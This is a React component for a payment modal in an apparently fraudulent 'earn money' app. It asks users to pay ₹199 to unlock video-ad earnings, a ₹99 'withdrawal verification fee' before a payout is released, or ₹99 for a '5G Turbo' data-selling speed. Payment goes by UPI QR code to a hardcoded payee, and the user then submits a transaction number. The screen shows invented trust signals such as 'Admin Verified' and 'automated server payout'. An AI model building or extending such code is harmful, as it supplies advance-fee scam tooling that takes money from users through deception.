import React, { useState } from 'react';
import { 
  X, 
  ShieldCheck, 
  QrCode, 
  Copy, 
  Check, 
  AlertCircle, 
  Sparkles, 
  Lock, 
  Zap, 
  Clock
} from 'lucide-react';
import { DepositGatewayConfig } from '../types';

export type PaymentVerificationType = 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99';

interface PaymentVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  type: PaymentVerificationType;
  depositConfig: DepositGatewayConfig;
  onSubmitUtr: (amount: number, utr: string, type: PaymentVerificationType) => void;
  userEmail: string;
  isPending?: boolean;
  pendingUtr?: string;
}

export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> = ({
  isOpen,
  onClose,
  type,
  depositConfig,
  onSubmitUtr,
  userEmail,
  isPending = false,
  pendingUtr,
}) => {
  const [utrNumber, setUtrNumber] = useState('');
  const [copiedUpi, setCopiedUpi] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  if (!isOpen) return null;

  let amount = 99;
  let title = '₹99 Verification Fee';
  let badgeLabel = 'PAYMENT GATE';
  let description = '';

  if (type === 'ADS_199') {
    amount = 199;
    title = '₹199 Video Ads Lifetime Unlock';
    badgeLabel = 'ADS ACTIVATION GATE';
    description = 'Watch & Earn video ads feature unlock karne ke liye ₹199 ka payment karein aur 12-digit UTR submit karein.';
  } else if (type === 'WITHDRAWAL_99') {
    amount = 99;
    title = '₹99 Withdrawal Verification Fee';
    badgeLabel = 'PAYOUT SECURITY VERIFY';
    description = 'Bank UPI payout verification aur automated server payout release ke liye ₹99 ka fee transfer karein aur 12-digit UTR submit karein.';
  } else if (type === 'SPEED_TURBO_99') {
    amount = 99;
    title = '₹99 5G Turbo Fast Selling Mode';
    badgeLabel = '5G TURBO SPEED BOOST';
    description = 'Data selling ko super fast 1000ms speed me bechne aur high-speed streaming unlock karne ke liye ₹99 ka payment karein aur UTR submit karein.';
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const handleCancel = () => {
    setErrorMsg(null);
    setUtrNumber('');
    onClose();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const clean = utrNumber.trim();
    if (!clean || clean.length < 6) {
      setErrorMsg('Kripya valid 12-digit UPI / Bank UTR Reference number daalein.');
      return;
    }
    setErrorMsg(null);
    setIsSubmitting(true);

    setTimeout(() => {
      setIsSubmitting(false);
      onSubmitUtr(amount, clean, type);
      onClose();
    }, 600);
  };

  // Generate UPI Intent URL
  const payeeUpi = depositConfig.upiId || 'techreal8806@oksbi';
  const payeeName = depositConfig.payeeName || 'DataSell Official';
  const upiUrl = `upi://pay?pa=${encodeURIComponent(payeeUpi)}&pn=${encodeURIComponent(payeeName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(title)}`;
  const qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(upiUrl)}&margin=8`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 bg-slate-950/85 backdrop-blur-md animate-in fade-in duration-200">
      <div className="w-full max-w-sm bg-slate-900 rounded-3xl overflow-hidden shadow-2xl border border-slate-800 flex flex-col relative animate-in zoom-in-95 duration-200 max-h-[92vh] overflow-y-auto text-slate-100">
        
        {/* Top Header */}
        <div className="bg-gradient-to-br from-slate-900 via-slate-900 to-slate-950 text-white p-4 relative overflow-hidden shrink-0 border-b border-slate-800">
          <div className="absolute top-0 right-0 w-32 h-32 bg-cyan-500/15 rounded-full blur-xl pointer-events-none" />
          
          <div className="flex items-center justify-between relative z-10">
            <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-slate-800 text-[10px] font-bold uppercase tracking-wider text-cyan-300 border border-cyan-500/30">
              <Sparkles className="w-3 h-3 text-cyan-400" />
              <span>{badgeLabel}</span>
            </div>

            <button
              onClick={handleCancel}
              title="Cancel payment"
              className="flex items-center gap-1 py-1 px-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold cursor-pointer transition-colors border border-slate-700"
            >
              <X className="w-3.5 h-3.5" />
              <span>Cancel</span>
            </button>
          </div>

          <h3 className="text-lg font-bold text-white mt-2 leading-tight">
            {title}
          </h3>
          <p className="text-[11px] text-slate-400 mt-1 leading-snug font-medium">
            {description}
          </p>
        </div>

        {/* Top Cancel Bar directly above payment form */}
        <div className="px-4 py-2.5 bg-slate-950 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-1.5 text-xs text-slate-300 font-semibold">
            <Lock className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
            <span>Instant UPI Gateway</span>
          </div>
          <button
            type="button"
            onClick={handleCancel}
            id="btn-top-cancel-payment"
            className="flex items-center gap-1 py-1 px-3 rounded-xl bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 text-xs font-bold transition-all active:scale-95 cursor-pointer border border-rose-500/40"
          >
            <X className="w-3.5 h-3.5" />
            <span>Cancel Payment</span>
          </button>
        </div>

        {/* Pending status warning if already submitted */}
        {isPending && (
          <div className="m-3 p-3 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-300 text-xs space-y-1.5">
            <div className="flex items-center gap-2 font-bold text-amber-300">
              <Clock className="w-4 h-4 animate-spin text-amber-400" />
              <span>Verification In Progress (PENDING)</span>
            </div>
            <p className="text-[11px] text-slate-300 leading-tight">
              Aapka UTR ({pendingUtr || 'Submitted'}) admin panel me verify ho raha hai. Approval ke baad feature unlock ho jayega.
            </p>
            <div className="pt-1 flex items-center justify-between">
              <span className="text-[10px] uppercase font-semibold text-amber-400">Status: Pending Admin Approval</span>
              <button
                type="button"
                onClick={handleCancel}
                className="text-[10px] font-bold text-cyan-400 underline cursor-pointer"
              >
                Close & Check Later
              </button>
            </div>
          </div>
        )}

        {/* QR Code & Payment Information */}
        <div className="p-4 space-y-3">
          {/* Payable Amount Box */}
          <div className="flex items-center justify-between bg-slate-950 border border-slate-800 rounded-2xl p-2.5">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-xl bg-cyan-500/15 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold text-sm">
                ₹
              </div>
              <div>
                <span className="text-[10px] text-slate-400 uppercase font-semibold block">Payable Amount</span>
                <span className="text-base font-bold text-white font-mono">₹{amount}.00</span>
              </div>
            </div>

            <span className="text-[10px] font-bold text-cyan-300 bg-cyan-500/10 px-2.5 py-1 rounded-lg border border-cyan-500/20">
              Admin Verified
            </span>
          </div>

          {/* QR Code Display */}
          <div className="flex flex-col items-center justify-center bg-slate-950 p-3 rounded-2xl border border-slate-800 shadow-xs">
            <div className="p-2 bg-white rounded-xl shadow-xs">
              <img
                src={qrImage}
                alt="Payment QR Code"
                className="w-36 h-36 object-contain"
              />
            </div>
            <p className="text-[10px] font-semibold text-slate-400 mt-2 flex items-center gap-1">
              <QrCode className="w-3.5 h-3.5 text-cyan-400" />
              <span>Scan QR using PhonePe, GPay, Paytm</span>
            </p>
          </div>

          {/* Payee Official UPI ID */}
          <div className="bg-slate-950 rounded-2xl p-2.5 border border-slate-800 flex items-center justify-between">
            <div className="truncate pr-2">
              <span className="text-[9px] uppercase font-semibold text-slate-400 block">Official Payee UPI ID</span>
              <span className="text-xs font-mono font-bold text-cyan-300 truncate block">
                {payeeUpi}
              </span>
            </div>

            <button
              type="button"
              onClick={() => handleCopy(payeeUpi)}
              className="py-1 px-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-cyan-400 font-bold text-[11px] transition-all flex items-center gap-1 cursor-pointer shrink-0 border border-slate-700"
            >
              {copiedUpi ? (
                <>
                  <Check className="w-3 h-3 text-emerald-400" />
                  <span className="text-emerald-400">Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3 h-3" />
                  <span>Copy UPI</span>
                </>
              )}
            </button>
          </div>

          {/* 12-Digit UTR Submission Form */}
          <form onSubmit={handleSubmit} className="space-y-3 pt-2 border-t border-slate-800">
            {errorMsg && (
              <div className="p-2.5 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
                <span>{errorMsg}</span>
              </div>
            )}

            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1">
                Enter 12-Digit UPI Reference (UTR) Number
              </label>
              <input
                type="text"
                required
                value={utrNumber}
                onChange={(e) => {
                  setUtrNumber(e.target.value);
                  setErrorMsg(null);
                }}
                placeholder="e.g. 423985729103"
                className="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-white font-mono text-sm tracking-wider focus:outline-hidden focus:border-cyan-400"
              />
              <p className="text-[10px] text-slate-400 mt-1">
                UPI app me payment hone ke baad 12-digit UTR copy karke yahan paste karein.
              </p>
            </div>

            <div className="pt-1 flex gap-2">
              <button
                type="button"
                onClick={handleCancel}
                className="flex-1 py-3 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold text-xs transition-all cursor-pointer min-h-[44px]"
              >
                Cancel
              </button>

              <button
                type="submit"
                disabled={isSubmitting}
                className="flex-2 py-3 px-3 rounded-xl bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-400 hover:to-emerald-400 text-slate-950 font-black text-xs shadow-md active:scale-95 transition-all cursor-pointer min-h-[44px] flex items-center justify-center gap-1.5 disabled:opacity-75"
              >
                <Zap className="w-4 h-4" />
                <span>{isSubmitting ? 'Verifying...' : `Submit UTR (₹${amount})`}</span>
              </button>
            </div>
          </form>
        </div>

      </div>
    </div>
  );
};
